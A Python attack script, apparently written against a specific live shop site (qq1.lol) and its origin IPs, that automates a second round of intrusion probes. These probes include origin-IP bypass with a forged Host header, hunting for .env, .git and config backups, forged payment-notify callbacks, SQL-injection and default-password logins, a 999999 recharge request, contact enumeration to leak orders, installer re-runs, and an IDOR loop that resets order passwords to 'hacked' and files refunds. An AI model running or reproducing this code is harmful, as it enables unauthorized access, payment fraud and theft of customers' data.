#!/usr/bin/env python3
"""qq1.lol round-2 probes: IP bypass, workorder, USDT, recharge, query enum, install steps, hidden paths"""
import json
import os
import re
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = os.environ.get("QQ1_BASE", "https://qq1.lol")
HOST = os.environ.get("QQ1_HOST", "qq1.lol")
ORIGINS = [x.strip() for x in os.environ.get("QQ1_ORIGINS", "45.158.21.213,103.43.11.95").split(",") if x.strip()]
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "alt_probe2.log"
HITS = OUT / "alt2_hits.jsonl"
JAR = str(OUT / ".alt2_cookies")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
TIMEOUT = os.environ.get("QQ1_TIMEOUT", "12")


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:4000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:220]}")


def curl(url, method="GET", post=None, host=None, extra=None):
    cmd = ["curl", "-sk", f"--max-time={TIMEOUT}", "-b", JAR, "-c", JAR, "-A", UA,
           "-H", f"Referer: {BASE}/", "-H", "X-Requested-With: XMLHttpRequest"]
    if host:
        cmd += ["-H", f"Host: {host}"]
    if extra:
        for h in extra:
            cmd += ["-H", h]
    if method == "POST":
        cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded"]
        if post:
            cmd += ["-d", post]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=int(TIMEOUT) + 5).stdout.strip()
    except Exception as e:
        return f"err:{e}"


def good(body):
    if not body or len(body) < 8:
        return False
    bad = ("404 Not Found", "请提供用户", "验证失败", "No Act", "code\":403", "code\":-5")
    markers = ("kminfo", "卡密", "----", '"code":0', "password", "success", "admin", "数据库", "mysql", "root@")
    return any(m in body for m in markers) and not all(b not in body for b in bad)


def get_csrf(page="/"):
    body = curl(f"{BASE}{page}")
    m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', body)
    return m.group(1) if m else ""


def get_hashsalt(page="/?mod=buy&cid=14&tid=131"):
    body = curl(f"{BASE}{page}")
    m = re.search(r"var hashsalt=(.+);", body)
    if not m:
        return ""
    try:
        return subprocess.run(
            ["node", "-e", f"var hashsalt={m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=5,
        ).stdout.strip()
    except Exception:
        return ""


# --- 1. Origin IP bypass ---
def test_ip_bypass():
    log("=== [1] Origin IP bypass ===")
    acts = [
        "ajax.php?act=getcount", "ajax.php?act=getclass", "ajax.php?act=gettoolnew",
        "%61pi.php?act=search&id=1", "user/ajax.php?act=login",
        "install/index.php", "other/getshop.php?trade_no=20260720145603146",
    ]
    for ip in ORIGINS:
        for act in acts:
            url = f"https://{ip}/{act}"
            body = curl(url, host=HOST)
            if body and "403" not in body[:20] and len(body) > 15:
                log(f"  {ip}/{act}: {body[:100]}")
                if good(body) or ("getcount" in act and '"code":0' in body):
                    hit("ip_bypass", f"{ip}/{act}", body)


# --- 2. Hidden paths / backup / admin variants ---
def test_hidden_paths():
    log("=== [2] Hidden paths ===")
    paths = [
        "admin.php", "admin/login.php", "manage/login.php", "htgl/login.php",
        "shequ/login.php", "fenzhan/login.php", "agent/login.php", "api/login.php",
        "user.php", "order.php", "pay.php", "notify.php", "epay.php",
        "other/usdt_notify.php", "other/rmb_notify.php", "other/pay_notify.php",
        "other/notify.php", "other/return.php", "other/callback.php",
        "other/alipay_return.php", "other/wxpay_return.php",
        "assets/upload/", "upload/image/", "runtime/cache/", "data/backup/",
        "backup/", "bak/", "old/", "test/", "debug/", "api/", "api/v1/orders",
        "user/order.php", "user/orders.php", "user/kami.php", "user/card.php",
        "sup/order.php", "sup/orders.php", "sup/kami.php",
        "workorder/ajax.php", "user/workorder/ajax.php",
        "cron.php.bak", "config.php.bak", "ajax.php~",
        ".git/HEAD", ".env", "phpinfo.php", "info.php", "p.php",
        "install/step2.php", "install/step3.php", "install/step4.php", "install/update.php",
    ]
    for p in paths:
        body = curl(f"{BASE}/{p}")
        if not body or len(body) < 10:
            continue
        if body.startswith("<!") and "404" in body[:200]:
            continue
        if any(x in body for x in ("<?php", "kminfo", "mysql", "DB_", "admin", "login", "install", "success", "订单", "卡密")):
            hit("hidden_path", p, body[:500])
        elif '"code":0' in body or ("json" in body[:1] and "code" in body):
            hit("hidden_json", p, body[:500])


# --- 3. Workorder / toollogs / getshuoshuo ---
def test_workorder_logs():
    log("=== [3] Workorder / logs ===")
    for p in ("workorder.php", "user/workorder.php", "user/workorder.php?my=list",
              "toollogs.php", "toollogs.php?page=1", "toollogs.php?act=list"):
        body = curl(f"{BASE}/{p}")
        if body and len(body) > 200 and "暂无" not in body:
            if any(x in body for x in ("订单", "卡密", "trade", "kminfo", "手机", "@")):
                hit("workorder_leak", p, body[:800])
    hs = get_hashsalt()
    for act in ("getshuoshuo", "getrizhi", "getshareid"):
        for uin in ("123456", "830603", "10000", "88888888", "buyi"):
            body = curl(f"{BASE}/ajax.php?act={act}&uin={uin}&page=1&hashsalt={hs}")
            if body and '"code":0' in body and len(body) > 80:
                hit("social_leak", f"{act} uin={uin}", body)


# --- 4. USDT / multi-pay notify ---
def test_usdt_pay():
    log("=== [4] USDT / multi-pay ===")
    tn = os.environ.get("QQ1_TRADE_NO", "20260720145603146")
    endpoints = [
        "other/usdt_notify.php", "other/rmb_notify.php", "other/pay_notify.php",
        "other/notify.php", "other/callback.php", "other/return.php",
        "other/epay_notify.php", "other/alipay_notify.php",
        "other/wxpay_notify.php", "other/qqpay_notify.php",
        "pay/notify.php", "notify/usdt.php", "usdt/notify.php",
    ]
    posts = [
        f"trade_no={tn}&status=1&money=99",
        f"out_trade_no={tn}&trade_status=TRADE_SUCCESS&money=99.00",
        f"orderid={tn}&pay_status=1",
        f"order_no={tn}&state=success&amount=99",
        "{}", '{"trade_no":"%s","status":1}' % tn,
    ]
    for ep in endpoints:
        body = curl(f"{BASE}/{ep}")
        if body and "404" not in body[:80] and len(body) > 3:
            log(f"  GET {ep}: {body[:80]}")
        for post in posts:
            b2 = curl(f"{BASE}/{ep}", "POST", post)
            if b2 and b2.lower() in ("ok", "success") or (b2 and "success" in b2.lower() and "fail" not in b2.lower()):
                hit("pay_notify", f"{ep} POST", b2)
    # submit type enum
    for t in ("alipay", "wxpay", "qqpay", "usdt", "rmb", "epay", "pay", "1", "2", "3"):
        body = curl(f"{BASE}/other/submit.php?type={t}&orderid={tn}")
        if body and "404" not in body[:60] and len(body) > 50:
            log(f"  submit type={t}: {body[:80]}")


# --- 5. Recharge / reg / login bypass ---
def test_auth_bypass():
    log("=== [5] Auth bypass ===")
    csrf = get_csrf("/user/reg.php")
    payloads = [
        ("user/ajax.php?act=reg", f"user=test{int(time.time())}&pass=123456&qq=123456&csrf_token={csrf}"),
        ("user/ajax.php?act=reg", f"user=admin&pass=admin123&qq=123456&csrf_token={csrf}"),
        ("user/ajax.php?act=login", "user=admin&pass=admin"),
        ("user/ajax.php?act=login", "user=admin' OR '1'='1&pass=x"),
        ("ajax.php?act=login", "user=admin&pass=admin"),
        ("ajax.php?act=admin", "page=1"),
        ("user/ajax.php?act=recharge", "money=999999"),
        ("user/ajax.php?act=userinfo", ""),
    ]
    for url, post in payloads:
        body = curl(f"{BASE}/{url}", "POST", post)
        if good(body) or (body and '"code":0' in body):
            hit("auth_bypass", f"{url} {post[:60]}", body)


# --- 6. Query contact enum ---
def test_query_enum():
    log("=== [6] Query enum ===")
    contacts = [
        "13800138000", "13888888888", "13900000000", "15800000000", "18888888888",
        "test@test.com", "admin@qq.com", "buyi@qq.com", "qqkqq@qq.com",
        "123456789", "830603", "buyi", "buyiq", "qq1", "admin",
        "20260720145603146", "20260720215518263", "20260720215519140",
    ]
    # add common phone suffix patterns
    for prefix in ("138", "139", "158", "188"):
        for suffix in ("00000001", "88888888", "12345678"):
            contacts.append(prefix + suffix)
    seen = set()
    for c in contacts:
        if c in seen:
            continue
        seen.add(c)
        body = curl(f"{BASE}/ajax.php?act=query", "POST", f"data={quote(c)}")
        if not body:
            continue
        if '"code":0' in body or "showOrder" in body or "skey" in body or "kminfo" in body:
            hit("query_leak", c, body)
        elif "订单" in body and "不存在" not in body and "未找到" not in body:
            hit("query_partial", c, body)


# --- 7. Install steps probe ---
def test_install_steps():
    log("=== [7] Install steps ===")
    steps = [
        ("install/index.php", "step=1"),
        ("install/index.php", "step=2"),
        ("install/index.php", "step=3"),
        ("install/step2.php", ""),
        ("install/step3.php", ""),
        ("install/update.php", ""),
        ("install/install.php", ""),
    ]
    for path, post in steps:
        body = curl(f"{BASE}/{path}", "POST" if post else "GET", post or None)
        if body and "已经安装" not in body and len(body) > 30:
            if any(x in body for x in ("数据库", "管理员", "install", "setup", "config", "mysql")):
                hit("install_step", f"{path} {post}", body[:600])


# --- 8. Gift / seckill / coupon deep ---
def test_marketing():
    log("=== [8] Marketing exploits ===")
    csrf = get_csrf("/")
    hs = get_hashsalt()
    acts = {
        "gift_start": f"tid=131&csrf_token={csrf}",
        "coupon": f"code=VIP&tid=131&csrf_token={csrf}",
        "cutshop": f"tid=131&csrf_token={csrf}",
        "groupshop": f"tid=131&csrf_token={csrf}",
        "seckill": f"tid=131&csrf_token={csrf}",
        "pay": f"tid=131&num=1&money=0&inputvalue=13800138000&hashsalt={hs}&csrf_token={csrf}",
    }
    for act, post in acts.items():
        body = curl(f"{BASE}/ajax.php?act={act}", "POST", post)
        if body and '"code":0' in body:
            hit("marketing", act, body)


# --- 9. apply_refund / changepwd IDOR with empty skey ---
def test_idor_extended():
    log("=== [9] IDOR extended ===")
    csrf = get_csrf("/?mod=query")
    for oid in list(range(25900, 25916)) + [1, 100]:
        for sk in ("", "null", "0", "1", "test", str(oid)):
            for act, extra in (
                ("order", f"id={oid}&skey={sk}"),
                ("changepwd", f"id={oid}&skey={sk}&pwd=hacked&csrf_token={csrf}"),
                ("apply_refund", f"id={oid}&skey={sk}&csrf_token={csrf}"),
            ):
                body = curl(f"{BASE}/ajax.php?act={act}", "POST", extra)
                if good(body):
                    hit("idor", f"{act} oid={oid} skey={sk}", body)


def main():
    log("=== qq1 ALT PROBE2 START ===")
    curl(f"{BASE}/")
    test_ip_bypass()
    test_hidden_paths()
    test_workorder_logs()
    test_usdt_pay()
    test_auth_bypass()
    test_query_enum()
    test_install_steps()
    test_marketing()
    test_idor_extended()
    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== ALT PROBE2 DONE hits={n} ===")


if __name__ == "__main__":
    main()
